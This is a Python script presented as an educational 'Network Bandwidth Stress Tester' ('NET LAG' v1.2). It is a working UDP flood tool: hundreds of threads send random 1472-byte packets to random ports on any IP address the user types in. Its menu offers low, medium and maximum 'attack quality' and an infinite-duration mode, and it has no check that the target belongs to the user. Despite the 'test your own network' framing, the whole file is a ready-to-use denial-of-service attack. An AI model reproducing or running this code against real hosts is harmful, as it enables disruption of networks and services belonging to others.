import socket
import threading
import time
import os
import random
import sys

# ==========================================
#           NETWORK STRESS TESTER
#       Created for Educational Purposes
# ==========================================

# ANSI Color Codes for Terminal
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
BOLD = '\033[1m'
RESET = '\033[0m'

# Configuration
PACKET_SIZE = 1472         # Max UDP Payload
TARGET_IP = "192.168.1.1"  # Default Router IP
DURATION = 60              # Default Duration in seconds (0 = Infinite)

# Global Variables
running = False
packets_sent = 0

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    clear_screen()
    banner = f"""{RED}{BOLD}
    ███╗   ██╗███████╗████████╗    ██╗      █████╗  ██████╗ 
    ████╗  ██║██╔════╝╚══██╔══╝    ██║     ██╔══██╗██╔════╝ 
    ██╔██╗ ██║█████╗     ██║       ██║     ███████║██║  ███╗
    ██║╚██╗██║██╔══╝     ██║       ██║     ██╔══██║██║   ██║
    ██║ ╚████║███████╗   ██║       ███████╗██║  ██║╚██████╔╝
    ╚═╝  ╚═══╝╚══════╝   ╚═╝       ╚══════╝╚═╝  ╚═╝ ╚═════╝ 
    {YELLOW}          [ Network Bandwidth Stress Tester v1.2 ]{RESET}
    {CYAN}            Test your own network security safely{RESET}
    """
    print(banner)

def is_valid_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def ask_for_ip():
    global TARGET_IP
    print(f"\n{CYAN}Current Target IP: {YELLOW}{TARGET_IP}{RESET}")
    new_ip = input(f"{CYAN}Enter new Target IP (Press Enter to keep current): {RESET}").strip()
    
    if new_ip:
        if is_valid_ip(new_ip):
            TARGET_IP = new_ip
            print(f"{GREEN}[+] Target IP successfully updated to {TARGET_IP}{RESET}")
        else:
            print(f"{RED}[-] Invalid IP format! Keeping {TARGET_IP}{RESET}")
    time.sleep(1.5)

def ask_for_duration():
    global DURATION
    print(f"\n{CYAN}Current Attack Duration: {YELLOW}{DURATION} seconds {RESET}(0 = Infinite)")
    new_dur = input(f"{CYAN}Enter new duration in seconds (Press Enter to keep current): {RESET}").strip()
    
    if new_dur:
        try:
            val = int(new_dur)
            if val >= 0:
                DURATION = val
                if DURATION == 0:
                    print(f"{GREEN}[+] Duration updated to INFINITE (Runs until CTRL+C){RESET}")
                else:
                    print(f"{GREEN}[+] Duration successfully updated to {DURATION} seconds{RESET}")
            else:
                print(f"{RED}[-] Duration cannot be negative! Keeping {DURATION}{RESET}")
        except ValueError:
            print(f"{RED}[-] Invalid input! Please enter a number.{RESET}")
    time.sleep(1.5)

def flood():
    global running, packets_sent, TARGET_IP
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while running:
        try:
            port = random.randint(1, 65535)
            data = os.urandom(PACKET_SIZE) 
            sock.sendto(data, (TARGET_IP, port))
            packets_sent += 1
        except Exception:
            pass

def stats_tracker():
    global running, packets_sent, TARGET_IP
    while running:
        time.sleep(1)
        sys.stdout.write(f"\r{CYAN}[>] Packets Sent: {YELLOW}{packets_sent}{CYAN} | Target: {RED}{TARGET_IP}{RESET}       ")
        sys.stdout.flush()
        packets_sent = 0

def timer_thread():
    global running, DURATION
    if DURATION > 0:
        time.sleep(DURATION)
        if running: # Check if user hasn't stopped it already
            running = False
            print(f"\n\n{GREEN}[!] Time limit reached ({DURATION}s). Stopping attack...{RESET}")
            time.sleep(1.5)

def start_attack(threads_count, quality_name):
    global running, packets_sent
    
    running = True
    packets_sent = 0
    
    time_text = f"{DURATION} seconds" if DURATION > 0 else "Infinite"
    
    print(f"\n{GREEN}[+]{RESET} Starting {YELLOW}{quality_name}{RESET} Attack on {RED}{TARGET_IP}{RESET}")
    print(f"{GREEN}[+]{RESET} Threads: {YELLOW}{threads_count}{RESET} | Duration: {YELLOW}{time_text}{RESET}")
    print(f"{RED}[!] Press CTRL+C to stop the attack manually...{RESET}\n")
    
    # Start timer thread only if duration is not 0
    if DURATION > 0:
        t_timer = threading.Thread(target=timer_thread)
        t_timer.daemon = True
        t_timer.start()

    # Start stats tracker
    t_stats = threading.Thread(target=stats_tracker)
    t_stats.daemon = True
    t_stats.start()

    # Start flood threads
    for i in range(threads_count):
        t = threading.Thread(target=flood)
        t.daemon = True
        t.start()

    try:
        while running:
            time.sleep(0.1)
    except KeyboardInterrupt:
        running = False
        print(f"\n\n{RED}[-] Attack aborted by user.{RESET}")
        time.sleep(1.5)

def menu():
    while True:
        display_banner()
        print(f"{GREEN}[+]{RESET} Target Gateway : {YELLOW}{TARGET_IP}{RESET}")
        
        time_text = f"{DURATION} seconds" if DURATION > 0 else "Infinite"
        print(f"{GREEN}[+]{RESET} Duration       : {YELLOW}{time_text}{RESET}\n")
        
        print(f"{CYAN}Select Attack Quality:{RESET}")
        print(f"  {GREEN}[1]{RESET} Low Quality     (100 Threads - Safe for Phone)")
        print(f"  {GREEN}[2]{RESET} Medium Quality  (300 Threads - Balanced)")
        print(f"  {GREEN}[3]{RESET} Maximum Quality (500 Threads - Aggressive)")
        print(f"  {CYAN}[4]{RESET} Change Target IP")
        print(f"  {CYAN}[5]{RESET} Change Attack Duration")
        print(f"  {RED}[0]{RESET} Exit\n")
        
        choice = input(f"{YELLOW}net-lag > {RESET}")
        
        if choice == '1':
            start_attack(100, "LOW QUALITY")
        elif choice == '2':
            start_attack(300, "MEDIUM QUALITY")
        elif choice == '3':
            start_attack(500, "MAXIMUM QUALITY")
        elif choice == '4':
            ask_for_ip()
        elif choice == '5':
            ask_for_duration()
        elif choice == '0':
            print(f"\n{GREEN}[+] Exiting... Goodbye!{RESET}")
            sys.exit()
        else:
            print(f"\n{RED}[-] Invalid choice! Please select from the options.{RESET}")
            time.sleep(1.5)

if __name__ == "__main__":
    try:
        menu()
    except KeyboardInterrupt:
        print(f"\n\n{RED}[-] Exiting...{RESET}")
        sys.exit()
